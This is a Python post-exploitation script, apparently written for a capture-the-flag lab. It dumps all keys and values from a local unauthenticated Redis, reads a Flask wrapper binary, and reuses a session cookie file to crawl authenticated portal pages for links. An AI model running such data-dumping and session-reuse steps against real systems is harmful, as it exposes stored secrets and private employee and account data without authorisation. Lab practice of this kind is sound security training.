#!/usr/bin/env python3
"""Dump local Redis (127.0.0.1:6379) via RESP, cat flask wrapper, harvest portal links."""
import socket
import sys
sys.path.insert(0, "/home/boss/Works/ctf/KPMG/VodooSpiritOfDeath2/artifacts")
from ssh_helper import connect, run

response = None  # placeholder


def read_line(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        c = sock.recv(1)
        if not c:
            break
        buf += c
    return buf[:-2]


def read_reply(sock):
    line = read_line(sock)
    if not line:
        return None
    t = line[:1]
    if t == b"+":
        return line[1:].decode(errors="replace")
    if t == b"-":
        return "ERR:" + line[1:].decode(errors="replace")
    if t == b":":
        return int(line[1:])
    if t == b"$":
        n = int(line[1:])
        if n == -1:
            return None
        data = b""
        while len(data) < n + 2:
            data += sock.recv(n + 2 - len(data))
        return data[:n]
    if t == b"*":
        n = int(line[1:])
        if n == -1:
            return None
        return [read_reply(sock) for _ in range(n)]
    return line


def cmd(sock, *args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    sock.sendall(out)
    return read_reply(sock)


def redis_dump():
    s = socket.create_connection(("127.0.0.1", 6379), timeout=10)
    keys = sorted(k.decode() for k in cmd(s, "KEYS", "*"))
    print("TOTAL %d keys" % len(keys))
    for k in keys:
        t = cmd(s, "TYPE", k)
        v = cmd(s, "GET", k)
        if isinstance(v, bytes):
            v = v.decode(errors="replace")
        print("=== %s [%s]\n%s\n" % (k, t, v))
    s.close()


if __name__ == "__main__":
    redis_dump()


# --- portal link harvesting + misc file reads ---
c = connect()
cmds = [
    "cat /usr/local/bin/flask 2>&1",
    "curl -s -m 8 -b /run/lock/acme.cookies http://127.0.0.1:5000/chat "
    "| grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
    "curl -s -m 8 -b /run/lock/acme.cookies http://127.0.0.1:5000/employees "
    "| grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
    "curl -s -m 8 -b /run/lock/acme.cookies http://127.0.0.1:5000/accounts "
    "| grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
    "curl -s -m 8 -b /run/lock/acme.cookies http://127.0.0.1:5000/dashboard "
    "| grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
    "curl -s -m 8 -b /run/lock/acme.cookies http://127.0.0.1:5000/chat/grp-announcements "
    "| grep -oE '(href|action|src)=\"[^\"]*\"' | sort -u",
]
for cmd in cmds:
    run(c, cmd)
c.close()